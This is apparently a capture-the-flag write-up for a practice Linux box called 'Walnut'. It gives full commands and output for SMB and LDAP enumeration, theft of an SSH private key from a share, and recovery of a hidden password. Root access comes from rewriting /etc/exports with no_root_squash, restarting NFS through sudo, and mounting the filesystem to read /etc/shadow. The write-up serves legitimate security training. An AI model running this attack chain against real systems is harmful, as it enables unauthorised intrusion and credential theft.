---
source: Hack Smarter
title: Walnut
difficulty: easy
tags: LDAP, bash, Service Abuse
summary: Walnut is an assumed breach scenario in which the client has provided us with credentials of a low privileged user to perform a penetration test on a critical Linux server. These credentials allow an attacker 
to craft LDAP queries to find sensitive information on another user which can then be used to recover ssh keys allowing the attacker remote access to the system. A custom script can be used to decipher additional user accounts and find additional 
sensitive information granting access to another user account. This user has sudo privileges to run a specific service that can be abused to export the entire file system which the attacker can mount to their machine.
---

## [01] Port Scan and Service Discovery

```term
$ sudo nmap -p- -sC -sV -vv --max-retries=0 -oN scans/nmap_all_tcp.txt 10.1.23.194

PORT      STATE    SERVICE     REASON         VERSION
22/tcp    open     ssh         syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a1:50:1d:04:de:66:51:74:29:2d:8e:87:af:5d:7d:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDAe2OGwLE70VoJDOkmnOr88x5SbEbR7mN7xhBqklK0Eyhcd9Edl4BwWaZmZ04fp2XG5bcRYfVYvD6LCxNDXSQk=
|   256 4a:db:47:8c:fa:61:66:2e:22:e5:df:da:bb:b3:ce:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIrrcUB1RZkqREz6oXnJ6JoTHvvkQfCehxAricf5Lelq
111/tcp   open     rpcbind     syn-ack ttl 62 2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp   open     netbios-ssn syn-ack ttl 62 Samba smbd 4
389/tcp   open     ldap        syn-ack ttl 62 OpenLDAP 2.2.X - 2.3.X
445/tcp   open     netbios-ssn syn-ack ttl 62 Samba smbd 4
2049/tcp  open     nfs         syn-ack ttl 62 3-4 (RPC #100003)
15367/tcp filtered unknown     no-response
40143/tcp open     nlockmgr    syn-ack ttl 62 1-4 (RPC #100021)
47039/tcp open     status      syn-ack ttl 62 1 (RPC #100024)
47231/tcp open     mountd      syn-ack ttl 62 1-3 (RPC #100005)
51249/tcp open     mountd      syn-ack ttl 62 1-3 (RPC #100005)
54219/tcp filtered unknown     no-response
57361/tcp open     mountd      syn-ack ttl 62 1-3 (RPC #100005)
63415/tcp filtered unknown     no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: WALNUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   WALNUT<00>           Flags: <unique><active>
|   WALNUT<03>           Flags: <unique><active>
|   WALNUT<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_clock-skew: -4h46m53s
| smb2-time:
|   date: 2026-09-03T01:18:19
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 52271/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 43215/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 61891/udp): CLEAN (Failed to receive data)
|   Check 4 (port 63857/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

This is a very interesting port scan. This is typically something you would see when scanning a Windows host. With us given initial credentials we can start checking our base level of access.

## [02] Leveraging Credentials To Find Seneitive Information

We can check for quick hits on NFS and SMB to see if any files are accessible.

`Checking NFS`
```term
$ showmount -e 10.1.23.194

Export list for 10.1.23.194:
```
`Checking SMB`
```term
$ smbclient -L 10.1.23.194 -U 'larryburns'

Password for [WORKGROUP\larryburns]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
!!        automation      Disk      automation share
        IPC$            IPC       IPC Service (walnut server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.1.23.194 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

We are able to find a custom share but we do not have access to it. We can see if there are any other users on the box.

`Checking for Users via nxc`
```term
$ nxc smb walnut.local -u 'larryburns' -p 'IloveMontgommery!' --users-export users.txt

SMB         10.1.23.194     445    WALNUT           [*] Unix - Samba (name:WALNUT) (domain:local) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.1.23.194     445    WALNUT           [+] local\larryburns:IloveMontgommery! (Guest)
SMB         10.1.23.194     445    WALNUT           -Username-                    -Last PW Set-       -BadPW- -Description-                                               
!!SMB         10.1.23.194     445    WALNUT           automation                    2025-09-19 13:54:28 0        
SMB         10.1.23.194     445    WALNUT           [*] Enumerated 1 local users: WALNUT
SMB         10.1.23.194     445    WALNUT           [*] Writing 1 local users to users.txt
```
We get one user, "automation". This is interesting as we recently found an "automation" share. LDAP next.

`Finding Sensitive Information via LDAP`
```term
$ ldapsearch -x -H ldap://walnut.local:389 -D 'uid=larryburns,ou=People,dc=walnut,dc=local' -W -b 'ou=People,dc=walnut,dc=local' '(objectClass=*)'

Enter LDAP Password:
---snip---
# automation, People, walnut.local
dn: uid=automation,ou=People,dc=walnut,dc=local
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: automation
sn: automation
givenName: automation
cn: automation
displayName: automation
uidNumber: 7789
gidNumber: 7789
gecos: automation
loginShell: /bin/bash
homeDirectory: /home/automation
!!description: old pw xxxxxxxx please change pw on all servers
---snip---
```
`Note`: The syntax for this query was difficult for me to get at first, there is an article I found here that helped me understand this a bit better - `https://www.golinuxcloud.com/ldap-openldap-basics/`

Let's use these new creds to check a potential new user.

```term
$ nxc smb walnut.local -u 'automation' -p 'xxxxxxxx' --shares                        

SMB         10.1.23.194     445    WALNUT           [*] Unix - Samba (name:WALNUT) (domain:local) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.1.23.194     445    WALNUT           [+] local\automation:xxxxxxxx 
SMB         10.1.23.194     445    WALNUT           [*] Enumerated shares
SMB         10.1.23.194     445    WALNUT           Share           Permissions            Remark
SMB         10.1.23.194     445    WALNUT           -----           -----------            ------
SMB         10.1.23.194     445    WALNUT           print$          READ                   Printer Drivers
!!SMB         10.1.23.194     445    WALNUT           automation      READ,WRITE             automation share
SMB         10.1.23.194     445    WALNUT           IPC$                                   IPC Service (walnut server (Samba, Ubuntu))
```

And we get a hit. Let's dump this share and read it's contents.

```term
$ bc /home/grehaus/.nxc/modules/nxc_spider_plus/10.1.23.194.json 

---snip---
!!  57 │         ".ssh/id_rsa": {
  58 │             "atime_epoch": "2025-09-18 08:30:17",
  59 │             "ctime_epoch": "2025-09-18 08:12:14",
  60 │             "mtime_epoch": "2025-09-18 08:12:14",
  61 │             "size": "2.55 KB"
  62 │         },
  63 │         ".ssh/id_rsa.pub": {
  64 │             "atime_epoch": "2025-09-19 08:39:26",
  65 │             "ctime_epoch": "2025-09-18 08:12:14",
  66 │             "mtime_epoch": "2025-09-18 08:12:14",
  67 │             "size": "576 B"
  68 │         },
  99 │         "scripts/runScript.sh": {
 100 │             "atime_epoch": "2025-09-18 15:29:12",
 101 │             "ctime_epoch": "2025-09-18 15:28:59",
 102 │             "mtime_epoch": "2025-09-18 15:28:59",
 103 │             "size": "226 B"
 104 │         },
---snip---
```

Juicy. Let's copy the ssh key over.

```term
$ nxc smb walnut.local -u 'automation' -p 'xxxxxxxx' --get-file '.ssh/id_rsa' 'id_rsa' --share automation

SMB         10.1.23.194     445    WALNUT           [*] Unix - Samba (name:WALNUT) (domain:local) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.1.23.194     445    WALNUT           [+] local\automation:xxxxxxxx 
SMB         10.1.23.194     445    WALNUT           [*] Copying ".ssh/id_rsa" to "id_rsa"
SMB         10.1.23.194     445    WALNUT           [+] File ".ssh/id_rsa" was downloaded to "id_rsa"
```

## [03] Shell as "automation", Finding Additional Credentials

Now that we have landed on the box, checking our users home directory shows some interesting directories.

```term
$ automation@walnut:~$ ls -la
total 48
drwxr-x--- 6 automation automation  4096 Sep 18  2025 .
drwxr-xr-x 7 root       root        4096 Sep 18  2025 ..
-rw------- 1 automation automation    10 Aug 30 13:04 .bash_history
drwx------ 2 automation automation  4096 Sep 18  2025 .cache
!!drwx------ 2 automation automation  4096 Sep 18  2025 .hidden
-rw------- 1 automation automation    20 Sep 18  2025 .lesshst
drwx------ 2 automation automation  4096 Sep 19  2025 .ssh
-rw------- 1 automation automation 11817 Sep 18  2025 .viminfo
!!drwxrwxr-x 3 automation automation  4096 Sep 18  2025 scripts
-rw------- 1 automation automation    33 Aug 30 12:53 user.txt
```

Looking through these we find the script below:
```term
#!/bin/bash

PARM1="$1"
PARM2=`echo -n "$1" | md5sum | cut -d' ' -f 1`
PARM3="$2"
DATE=`date +%d.%m.%Y-%Hh%m.%S`

su - "$PARM1" -c "$PARM3" < /home/automation/.hidden/"$PARM2" > /home/automation/scripts/logs/"$1"-"$DATE".log
```
This script essentially takes a user to run a command as, use hidden file that is the md5sum of the given user as stdin and direct stdout to a log file. Let's see what other users are on this box.

```term
$ cat /etc/passwd

localjob1:x:5000:5000:,,,:/home/localjob1:/bin/bash
localjob2:x:5001:5001:,,,:/home/localjob2:/bin/bash
localjob3:x:5002:5002:,,,:/home/localjob3:/bin/bash
localjob4:x:5003:5003:,,,:/home/localjob4:/bin/bash
```

These line up with the automation theme of this user, most likely running independent jobs for, well, automation. *buhdumtiss*. We know the input files are the md5sum of the username, and with only 4 interesting users we can easily deduce which log file 
belongs to who. Looking at the .hidden directory reveals one file that stands out from the rest.

```term
$ automation@walnut:~$ cat .hidden/b4d2ab0ea77f3306355ac7b2bcfcd614.bak 

!!xxxxxxxx
```

Adding all of this up, we now know we have a script that leverages other user accounts, takes a file as input, and writes the output to a log. This could easily be a password. First we should find which user this belongs to. We can do so by calculating the md5sum 
of the users we found so far.

```term
$ automation@walnut:~$ echo -n 'localjob3' | md5sum

!!b4d2ab0ea77f3306355ac7b2bcfcd614
```

Bingo.

## [04] Privilege Escalation via nfs-kernel-server.service

Checking sudo privileges for our new user shows the following:

```term
$ localjob3@walnut:~$ sudo -l

Matching Defaults entries for localjob3 on walnut:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User localjob3 may run the following commands on walnut:
!!    (ALL) NOPASSWD: /usr/bin/systemctl restart nfs-kernel-server.service
```

Let's see what exactly this is.

```term
$ localjob3@walnut:~$ systemctl cat nfs-kernel-server.service

# /usr/lib/systemd/system/nfs-server.service
[Unit]
Description=NFS server and services
DefaultDependencies=no
Requires=network.target proc-fs-nfsd.mount
Requires=nfs-mountd.service
Wants=rpcbind.socket network-online.target
Wants=rpc-statd.service nfs-idmapd.service
Wants=rpc-statd-notify.service
Wants=nfsdcld.service

After=network-online.target local-fs.target
After=proc-fs-nfsd.mount rpcbind.socket nfs-mountd.service
After=nfs-idmapd.service rpc-statd.service
After=nfsdcld.service
Before=rpc-statd-notify.service

# GSS services dependencies and ordering
Wants=auth-rpcgss-module.service rpc-svcgssd.service
After=rpc-gssd.service gssproxy.service rpc-svcgssd.service

[Service]
Type=oneshot
RemainAfterExit=yes
!!ExecStartPre=-/usr/sbin/exportfs -r
ExecStart=/usr/sbin/rpc.nfsd
ExecStop=/usr/sbin/rpc.nfsd 0
ExecStopPost=/usr/sbin/exportfs -au
ExecStopPost=/usr/sbin/exportfs -f

!!ExecReload=-/usr/sbin/exportfs -r

[Install]
WantedBy=multi-user.target
```

We can see the service will execute `/usr/sbin/exportfs -r` upon reload, which is exactly what our user can do. Now we need to see what `exportfs -r` is doing.

```term
$ localjob3@walnut:~$ man exportfs | grep "\-r" -A5

       /usr/sbin/exportfs -r [-v]
       /usr/sbin/exportfs [-av] -u [client:/path ..]
       /usr/sbin/exportfs [-v]
       /usr/sbin/exportfs -f
       /usr/sbin/exportfs -s

--
!!       -r     Reexport  all directories, synchronizing /var/lib/nfs/etab with /etc/exports and files under /etc/exports.d.  This option removes entries in /var/lib/nfs/etab which have been deleted from /etc/exports or files under /etc/exports.d, and removes any entries from
!!              the kernel export table which are no longer valid.
```

This will attempt to sync /var/lib/nfs/etab with /etc/exports and files under /etc/exports.d. Next, check permissions on `/etc/exports`.

```term
$ localjob3@walnut:~$ ls -l /etc/exports

!!-rw-rw-r--+ 1 root root 395 Sep  3 03:46 /etc/exports
```

Checking file permissions shows a `+` on the end. This means there is an access control list (ACL) that exceeds the normal file permissions. We can check these with `getfacl`.

```term
$ localjob3@walnut:~$ getfacl /etc/exports

getfacl: Removing leading '/' from absolute path names
# file: etc/exports
# owner: root
# group: root
user::rw-
!!user:localjob3:rw-
group::r--
mask::rw-
other::r--
```

Our user has "rw-" permissions, read and write. We finally know that we have some control over this service. Since /etc/exports is used for NFS, and we saw from the initial port scan that NFS is responding, our logical next step is to overwrite the /etc/exports file to 
export the file system (or any arbitrary combination of it) and then mount it back to our local machine. We can do so by modifying the /etc/exports file as such:

```term
$ localjob3@walnut:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
!!/ *(rw,sync,no_root_squash)
```

The important addition here is the `no_root_squash` option. This is needed because when we connect to the NFS server as root (allowing us to read root owned files), the NFS server will check the UID of the NFS client. In a properly secured system, the NFS 
server would see UID 0 coming from the client and "squash" their permissions so they can not access the server root. no_root_squash disables this leaves the door open for us as long as we authenticate as UID 0 (root). Now we can execute our sudo privileges 
and open the file system to be mounted remotely.

```term
$ localjob3@walnut:~$ sudo /usr/bin/systemctl restart nfs-kernel-server.service
```

We can then verify back on our machine that the file system is reachable.

```term
$ showmount -e 10.1.23.194

Export list for 10.1.23.194:
/ *
```

Now mount and loot.

```term
$ sudo mount -t nfs 10.1.23.194:/ /mnt/walnut -o nolock
```

```term
$ sudo cat /mnt/walnut/etc/shadow

!!root:$y$j9T$UmHpSRJ1qYhfOG.6OldZb0$38vr3gUa/TG0MNy2wP2uaV6.8fabfuke8zNISI6OTz8:20349:0:99999:7::: 
```
